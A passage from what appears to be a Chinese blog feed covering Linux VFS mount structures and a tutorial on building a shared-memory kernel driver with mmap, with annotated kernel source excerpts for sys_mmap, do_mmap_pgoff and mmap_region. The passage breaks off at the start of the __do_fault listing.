class="title">list_head</span> <span class="title">mnt_slave_list</span>;</span><span class="comment">/* list of slave mounts */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mnt_slave</span>;</span><span class="comment">/* slave list entry */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">mnt_master</span>;</span><span class="comment">/* slave is on master-&gt;mnt_slave_list */</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 所在的虚拟文件系统命名空间*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mnt_namespace</span> *<span class="title">mnt_ns</span>;</span><span class="comment">/* containing namespace */</span></span><br><span class="line"><span class="type">int</span> mnt_id;<span class="comment">/* mount identifier */</span></span><br><span class="line"><span class="type">int</span> mnt_group_id;<span class="comment">/* peer group identifier */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We put mnt_count &amp; mnt_expiry_mark at the end of struct vfsmount</span></span><br><span class="line"><span class="comment"> * to let these frequently modified fields in a separate cache line</span></span><br><span class="line"><span class="comment"> * (so that reads of mnt_flags wont ping-pong on SMP machines)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">atomic_t</span> mnt_count;</span><br><span class="line"><span class="type">int</span> mnt_expiry_mark;<span class="comment">/* true if marked for expiry */</span></span><br><span class="line"><span class="type">int</span> mnt_pinned;</span><br><span class="line"><span class="type">int</span> mnt_ghosts;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line"><span class="type">int</span> *mnt_writers;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">int</span> mnt_writers;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>struct list_head mnt_hash;</code>：全局散列表。</li><li><code>struct vfsmount *mnt_parent;</code>：父文件系统的挂载点。</li><li><code>struct dentry *mnt_mountpoint;</code>： 父文件系统中该挂载点的 dentry。</li><li><code>struct dentry *mnt_root;</code>：当前文件系统中该挂载点的 dentry。</li><li><code>struct super_block *mnt_sb;</code>：指向文件系统的 super_block 。</li><li><code>struct list_head mnt_mounts;</code>：该挂载点下面的子挂载点列表。</li><li><code>struct list_head mnt_child;</code>：父文件系统的子挂载点的列表节点。</li><li><code>const char *mnt_devname;</code>：挂载的设备名。</li></ul><p>​最后，用这幅图来总结一下<code>struct file_system_type </code>，<code>struct vfsmount</code>以及<code>struct super_block</code>之间的关系。</p><p><img src="https://s2.loli.net/2023/01/18/xMGzm5QgSpiHUE3.png" alt="image.png"></p><p>​以及我们再来看一个实例，在下图中，根文件系统为<code>squashfs</code>，根目录为<code>“/”</code>，然后创建<code>/tmp</code>目录，并挂载为<code>ramfs</code>，之后又创建了<code>/tmp/usbdisk/volume9</code>和<code>/tmp/usbdisk/volume1</code>两个目录，并将<code>/tmp/dev/sda1</code>和<code>/tmp/dev/sdb1</code>两个分区挂载到这两个目录上。挂载完成后，VFS 中相关的数据结构的关系如图所示。</p><p><img src="https://s2.loli.net/2023/01/18/WyFNLAr8SXUBoG2.png" alt="image.png"></p><p>​Linux 支持相当多种类的文件系统，从本地文件系统（如 EXT2 等）到网络文件系统（如 NFS 等），Linux 标准内核已支持当年文件系统超过60种，多亏 VFS 层提供的统一框架，使得它们可以很轻松地与上层应用进行交互。</p><p>​到此，本章的故事总算也该讲完了，关于文件系统其实还有很重要的一块知识没谈到，那就是各种缓存机制，那么下一章我们可能再进一步分析一下文件系统相关的系统调用流程，也会谈到缓存，或自己动手操作一下相关的代码。最后，快过年了，也祝友友们新年快乐~</p>]]></content>
      
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核分析应用一 - 多进程共享内存内核驱动模块</title>
      <link href="/2023/01/13/O02_Linux_kernel_1/"/>
      <url>/2023/01/13/O02_Linux_kernel_1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>上一章节分析到 Linux 的虚拟地址空间布局，正好这段时间在学 Linux 内核，这部分内存管理是上一篇文章的有力实践，通过自己实现一个内核模块，可以进一步加深对 Linux 内存管理的认识，同时也对 Linux 内核开发有个学习！源代码在文末我放在 Gitee 上了，友友们遇到 bug 可以自行对照一下。</p></blockquote><h1 id="驱动功能演示"><a href="#驱动功能演示" class="headerlink" title="驱动功能演示"></a>驱动功能演示</h1><p>​目标：实现一个内核驱动模块，建立一个设备文件，在用户态用 mmap 将设备映射到各自的进程空间来实现进程间通信。首先编译并安装该内核模块，其中的<code>map_driver.c</code>便是该内核模块的源文件：</p><p><img src="https://s2.loli.net/2023/01/13/ZLTczpjRBvfghsq.png" alt="演示1.png"></p><p>​然后编译运行用户态程序，一个程序负责写入，另一个程序可以从该共享内存区读出相应的值，其中的<code>ASDDDFFGGHHJJKKL</code>即写进程的输入，读进程可以看到对应的值以及其虚拟地址空间（<code>Page1 initialize...</code>信息是我预设的初始字符串）。</p><p><img src="https://s2.loli.net/2023/01/13/KXgIW9BOz5l7pkn.png" alt="演示2.png"></p><p>​作为内核调试的重要一部分，还加入了日志信息可以查看内核加载卸载提示，对应进程的 pid ，读写信息，物理及逻辑地址等等，输入命令<code>dmesg</code>可以看到：</p><p><img src="https://s2.loli.net/2023/01/13/uptW5Vl9XTZOaCq.png" alt="演示3"></p><h1 id="内核开发原理"><a href="#内核开发原理" class="headerlink" title="内核开发原理"></a>内核开发原理</h1><p>​在了解整个代码流程之前，由个比较重要的前置知识 - Linux 内核模块开发，我在这里就不单独介绍了，友友们如果没了解过可以先去看看这部分的小基础。Linux 模块由没链接成完整的可执行文件的目标代码组成，可以动态链接到内核中，而内核空开发也与 c库开发存在区别，你只需要了解内核模块的编译，加载，查询，卸载，日志打印等流程，以及 Linux 内核模块代码结构即可。-&gt; <a href="https://zhuanlan.zhihu.com/p/420194002">如何编写一个Linux内核模块，这次手把手教你</a>。此外，这里有个[ Linux 内核 api 手册](<a href="https://deepinout.com/linux-kernel-api">Linux内核API|极客笔记 (deepinout.com)</a>)，感觉蛮不错的，需要的时候可以查查。</p><p>​该程序是实现一个内核驱动模块，通过共享设备文件来实现进程间通信。对于传统的读写文件方式，首先进程通过 open 函数打开设备文件，然后使用 read ,  write 以及 lseek 等调用进行 I&#x2F;O 操作， 这种方式是非常低效的，每一次 I&#x2F;O 操作都需要与外设交互，可能会频繁的触发系统调用导致 I&#x2F;O 效率的降低。所以我们在这里使用 mmap() 函数来解决这个问题，mmap 系统调用其实并不是完全为了用于共享内存而设计的，它本身提供了不同于一般对普通文件的访问方式，进程可以像读写内存一样对普通文件的操作。而 Posix 或 systemV 的共享内存 IPC 则纯粹用于共享内存目的，当然 mmap() 实现共享内存也是其主要应用之一。</p><p>​<code>mmap</code>函数的主要作用是可以将一个文件或者设备的内容映射到内存当中，用户就可以通过一些内存操作方式(如<code>memcpy</code>、<code>memset</code>)对文件或者设备进行直接操作，不必再调用 read ，write 等进行 I&#x2F;O 设备文件操作。mmap 并不分配物理空间, 只是将文件映射到调用进程的地址空间里（只会占用 virutal memory）, 一旦进行文件读写，操作系统就会陷入缺页中断进行物理页框的分配。文件写完后，内存中的内容并不会立即更新到文件中，而是待内存回收时写回设备文件中，当然也可以调用 msync 进行显式同步，这样所写的内容就能立即保存到文件里了，这和自己的驱动设计有关。 此外，通过 mmap 来写文件的方式无法增加文件的长度, 因为要映射的长度在调用 mmap 的时候就决定。如果想取消内存映射，可以调用 munmap 来进行取消。</p><p><img src="https://s2.loli.net/2023/01/13/7XbBUgv9NDpwCdJ.png" alt="image.png"></p><p>​mmap 本身是一个很复杂的系统调用过程，每个版本的设计也有所不同，我们先看一下基于 Linux 4.x 的实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> * <span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *start, <span class="type">size_t</span> length, <span class="type">int</span> prot , <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span></span><br></pre></td></tr></table></figure><ul><li>start：要映射到的内存区域的起始地址，通常都是用NULL，表示由内核来指定该内存地址。</li><li>length：要映射的内存区域的大小。</li><li>prot：期望的内存保护标志，不能与文件的打开模式冲突，可以通过 or 运算合理地组合在一起。<ul><li>PROT_EXEC  ：页内容可以被执行</li><li>PROT_READ  ： 页内容可以被读取</li><li>PROT_WRITE ： 页可以被写入</li><li>PROT_NONE  ：页不可访问</li></ul></li><li>flags：指定映射对象的类型，映射选项和映射页是否可以共享等标志位，下面给出几个比较重要的。<ul><li>MAP_FIXED ：使用指定的映射起始地址，如果由 start 和 len 参数指定的内存区重叠于现存的映射空间，重叠部分将会被丢弃。如果指定的起始地址不可用，操作将会失败。并且起始地址必须落在页的边界上。</li><li>MAP_SHARED ：对映射区域的写入数据会复制回文件内, 而且允许其他映射该文件的进程共享。</li><li>MAP_PRIVATE ：建立一个写入时拷贝的私有映射。内存区域的写入不会影响到原文件。</li><li>MAP_LOCKED ：锁定映射区的页面，从而防止页面被交换出内存。</li><li>MAP_ANONYMOUS ：匿名映射，映射区不与任何文件关联。</li></ul></li><li>fd：文件描述符（由open函数返回）。</li><li>offset：以文件开始处的偏移量，该值应该为大小为 PAGE_SIZE 的整数倍，通常为0表示从文件头开始映射。</li></ul><p>​mmap 系统调用的实现过程大致流程如下：</p><ol><li>先通过文件系统定位要映射的文件；  </li><li>权限检查, 映射的权限不会超过文件打开的方式, 也就是说如果文件是以只读方式打开, 那么则不允许建立一个可写映射；</li><li>创建一个vma对象, 并对之进行初始化；</li><li>调用映射文件的mmap函数, 其主要工作是给vm_ops向量表赋值；</li><li>把该vma链入该进程的vma链表中, 如果可以和前后的vma合并则合并；</li><li>如果是要求VM_LOCKED(映射区不被换出)方式映射, 则发出缺页请求, 把映射页面读入内存中。</li></ol><p>​总体来说 mmap 的调用过程复杂，短时间内还没法做到很深的掌握，下面我们按照其调用流程依次做一个简单的源码分析，为后面的内核开发做个小铺垫。下面是大体的 mmap 函数调用栈帧：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mmap</span>()</span><br><span class="line">└→<span class="built_in">sys_mmap</span>()</span><br><span class="line">    └→ <span class="built_in">sys_mmap_pgoff</span>()</span><br><span class="line">    └→ <span class="built_in">vm_mmap_pgoff</span>()</span><br><span class="line">            └→ <span class="built_in">do_mmap_pgoff</span>() ※</span><br><span class="line">               └→ <span class="built_in">mmap_region</span>()</span><br><span class="line">                  └→ file-&gt;f_op-&gt;<span class="built_in">mmap</span>(file, vma);</span><br></pre></td></tr></table></figure><p>​mmap 是通过系统调用进入内核，其对应的内核系统调用是<code>sys_mmap</code>函数，下面是 x86 下的系统调用表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#<span class="meta"># arch/x86/entry/syscalls/syscall_64.tbl64位系统下的mmap系统调用</span></span><br><span class="line"><span class="number">9</span>commonmmapsys_mmap</span><br><span class="line"><span class="number">10</span>commonmprotectsys_mprotect</span><br><span class="line"><span class="number">11</span>commonmunmapsys_munmap</span><br></pre></td></tr></table></figure><p>​<code>sys_mmap</code>的源码如下所示，主要处理了 offset 的页对齐问题，并进入<code>sys_mmap_pgoff</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">sys_mmap</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> prot, <span class="type">unsigned</span> <span class="type">long</span> flags, <span class="type">unsigned</span> <span class="type">long</span> fd, <span class="type">unsigned</span> <span class="type">long</span> off)</span>;</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span> error;</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (off &amp; ~PAGE_MASK) <span class="comment">// 判断offset是否是页对齐，如果不是页对齐就返回错误</span></span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">error = sys_mmap_pgoff(addr, len, prot, flags, fd, off &gt;&gt; PAGE_SHIFT);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​<code>sys_mmap_pgoff</code>函数主要处理了文件映射和匿名映射的预处理，下一步进入<code>vm_mmap_pgoff</code>函数，<code>vm_mmap_pgoff</code>函数处理了安全性问题，然后就进入下一关键的函数<code>do_mmap_pgoff</code>（下面的代码里写了详细的注释步骤）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">do_mmap_pgoff</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">long</span> addr, </span></span><br><span class="line"><span class="params">              <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">unsigned</span> <span class="type">long</span> prot, </span></span><br><span class="line"><span class="params">              <span class="type">unsigned</span> <span class="type">long</span> flags, <span class="type">unsigned</span> <span class="type">long</span> pgoff)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 1. 获取一个未被使用的虚拟内存区，并返回其起始地址</span></span><br><span class="line">    addr = get_unmapped_area(file, addr, len, pgoff, flags);</span><br><span class="line">    <span class="keyword">if</span> (addr &amp; ~PAGE_MASK)</span><br><span class="line">        <span class="keyword">return</span> addr;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 根据映射类型做一些 flag 值的设定和错误检查。</span></span><br><span class="line"><span class="keyword">if</span> (file) &#123; <span class="comment">// 如果file不为NULL，则表示是基于文件的映射，否则是匿名映射</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file); <span class="comment">// 根据file获取inode结构</span></span><br><span class="line"><span class="keyword">switch</span> (flags &amp; MAP_TYPE) &#123; <span class="comment">// 根据是私有映射还是共享映射进行不同的处理</span></span><br><span class="line"><span class="keyword">case</span> MAP_SHARED: <span class="comment">// 共享映射</span></span><br><span class="line"><span class="keyword">if</span> ((prot&amp;PROT_WRITE) &amp;&amp; !(file-&gt;f_mode&amp;FMODE_WRITE))</span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_APPEND(inode) &amp;&amp; (file-&gt;f_mode &amp; FMODE_WRITE)) <span class="comment">// 判断是否为APPEND-ONLY文件，mmap不允许写入这种类型文件</span></span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (locks_verify_locked(file))</span><br><span class="line"><span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新一系列的使用于vm_area_struct的flag</span></span><br><span class="line">vm_flags |= VM_SHARED | VM_MAYSHARE;</span><br><span class="line"><span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line">vm_flags &amp;= ~(VM_MAYWRITE | VM_SHARED);</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> MAP_PRIVATE: <span class="comment">// 私有映射，也是设置flag</span></span><br><span class="line"><span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_READ)) <span class="comment">// 如果文件本身不允许读，那么就直接返回</span></span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line"><span class="keyword">if</span> (file-&gt;f_path.mnt-&gt;mnt_flags &amp; MNT_NOEXEC) &#123;</span><br><span class="line"><span class="keyword">if</span> (vm_flags &amp; VM_EXEC)</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">vm_flags &amp;= ~VM_MAYEXEC;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file-&gt;f_op-&gt;mmap)</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"><span class="keyword">if</span> (vm_flags &amp; (VM_GROWSDOWN|VM_GROWSUP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 匿名映射，也是设置flag</span></span><br><span class="line"><span class="keyword">switch</span> (flags &amp; MAP_TYPE) &#123;</span><br><span class="line"><span class="keyword">case</span> MAP_SHARED:</span><br><span class="line"><span class="keyword">if</span> (vm_flags &amp; (VM_GROWSDOWN|VM_GROWSUP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">pgoff = <span class="number">0</span>; <span class="comment">// 共享匿名映射忽略pgoff</span></span><br><span class="line">vm_flags |= VM_SHARED | VM_MAYSHARE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> MAP_PRIVATE:</span><br><span class="line">pgoff = addr &gt;&gt; PAGE_SHIFT; <span class="comment">// 匿名私有映射使用分配出来的addr作为pgoff</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 3. 调用 mmap_region() 函数继续进行映射操作</span></span><br><span class="line">    addr = mmap_region(file, addr, len, vm_flags, pgoff);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​总结起来该函数主要就是申请一段虚拟内存地址区域，然后根据映射类型做一些 flag 值的设定和错误检查，最后调用 <code>mmap_region()</code> 函数来进行进程的用户空间映射操作。接下来我们继续看看下一层的 <code>mmap_region()</code> 函数的实现，其完成了最后的映射过程，即将用户需要映射的虚拟地址范围加入当前进程的<code>mm_struct</code>结构中。</p><blockquote><p>对了，在往下探究之前请确保你对 <code>mm_struct</code>结构体和<code>vm_area_struct</code>结构体还算了解。我在上一篇文章有对其的介绍，不了解的同学可以先看看上一篇文章。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">mmap_region</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">long</span> addr,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">unsigned</span> <span class="type">long</span> flags,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">int</span> vm_flags, <span class="type">unsigned</span> <span class="type">long</span> pgoff,</span></span><br><span class="line"><span class="params">            <span class="type">int</span> accountable)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取当前进程的 mm_struct 结构。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>, *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="type">int</span> correct_wcount = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> error;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 申请一个虚拟内存区管理结构(vma)</span></span><br><span class="line">    <span class="comment">// 用find_vma_links函数寻找当前进程的虚拟地址空间所管理的内存块(vma)是否与目前预备分配的内存块的地址有相交的关系，如果有先将其unmap</span></span><br><span class="line"><span class="keyword">if</span> (find_vma_links(mm, addr, addr + len, &amp;prev, &amp;rb_link, &amp;rb_parent)) &#123;</span><br><span class="line"><span class="keyword">if</span> (do_munmap(mm, addr, len))</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> munmap_back;</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前申请的虚拟地址空间是否可以当前进程的虚拟地址空间进行合并，</span></span><br><span class="line">    <span class="comment">// 如果可以合并，直接修改当前进程的vma的vm_start和vm_end的值。</span></span><br><span class="line">vma = vma_merge(mm, prev, addr, addr + len, vm_flags, <span class="literal">NULL</span>, file, pgoff, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (vma)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="comment">// 如果无法合并，根据用户申请的地址空间范围，分配一个新的vma结构。</span></span><br><span class="line">vma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 初始化vma结构各个字段的信息</span></span><br><span class="line">    vma-&gt;vm_mm = mm;</span><br><span class="line">    vma-&gt;vm_start = addr;</span><br><span class="line">    vma-&gt;vm_end = addr + len;</span><br><span class="line">    vma-&gt;vm_flags = vm_flags;</span><br><span class="line">    vma-&gt;vm_page_prot = protection_map[vm_flags &amp; (VM_READ|VM_WRITE|VM_EXEC|VM_SHARED)];</span><br><span class="line">    vma-&gt;vm_pgoff = pgoff;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file) &#123;<span class="comment">// 文件映射</span></span><br><span class="line">        ...</span><br><span class="line">        vma-&gt;vm_file = file;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 3. 此处是内存映射的关键点，调用文件系统的mmap函数作处理，</span></span><br><span class="line"><span class="comment">         * 该函数可自定义，文件系统会根据设计设定各自的mmap函数。</span></span><br><span class="line"><span class="comment">         * 同时还设置vma结构的 fault() 回调函数去处理page fault的情况。</span></span><br><span class="line"><span class="comment">         *    vma对象的 fault() 回调函数的作用是：</span></span><br><span class="line"><span class="comment">         *        - 当访问的虚拟内存没有映射到物理内存时，</span></span><br><span class="line"><span class="comment">         *        - 将会调用 fault() 回调函数对虚拟内存地址映射到物理内存地址。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        error = file-&gt;f_op-&gt;mmap(file, vma);</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">// 匿名映射</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 把 vma 结构连接到进程虚拟内存区的链表和红黑树中。</span></span><br><span class="line">    vma_link(mm, vma, prev, rb_link, rb_parent);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​我们可以看到，该函数根据用户需要分配的地址空间的信息，或扩展当前的进程的虚拟地址空间范围，或创建一个新的 vma 结构加入到进程的 mm_struct 当中，这样当前进程就有可以直接访问的 mmap 分配的内存区域，自此完成了整个 mmap 的映射过程了。不过注意这里只是分配了 vma 结构到进程的虚拟地址空间当中，只有实际访问页面的时候才会触发 page-fault 缺页异常，并给这些刚刚分配的虚拟地址空间的 vma 结构分配物理页框并建立页表。</p><p>​因此，对于多进程的共享文件映射，每个进程在调用 mmap 时都是单独建立自己的 vma 区域。在后续访问中，通过 page-fault 缺页异常构建自己的物理页框映射时，需要花较长时间访问硬盘才能将该文件对应的页的数据读入到内存，相比而言，共享匿名映射就会更加快速。</p><p>​自此， mmap 的通用流程就该结束了，当执行到<code>error = file-&gt;f_op-&gt;mmap(file, vma);</code>这一句时，正如上面所分析，该<code>mmap(file, vma)</code> 函数由各个设备的模块自定义，而我们后面写的内核模块其中一个任务也就是完成这部分代码。</p><p>​接下来我们再来简单看看缺页过程吧，mmap 众所周知只分配虚拟地址，当进程在实际读写时亦触发缺页中断，进而分配物理页框并建立页表映射。缺页异常的调用过程实际上也是相当复杂，这里我们就不再过多介绍了，这有篇文章，可以参考一下 <a href="https://zhuanlan.zhihu.com/p/540850512">缺页中断</a>，大体调用栈如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">do_page_fault</span>()</span><br><span class="line">└→ <span class="built_in">handle_mm_fault</span>()</span><br><span class="line">   └→ <span class="built_in">handle_pte_fault</span>()</span><br><span class="line">      └→ <span class="built_in">do_linear_fault</span>()</span><br><span class="line">         └→ __do_fault() ※</span><br></pre></td></tr></table></figure><p>​我们直接来看一下最后一步，<code>__do_fault()</code>函数实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__do_fault(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span><br><span class="line">           <span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">pmd_t</span> *pmd, <span class="type">pgoff_t</span> pgoff,</span><br><span class="line">           <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">pte_t</span> orig_pte)</span><br><span class="line">&#123;</span><br><span class="line">    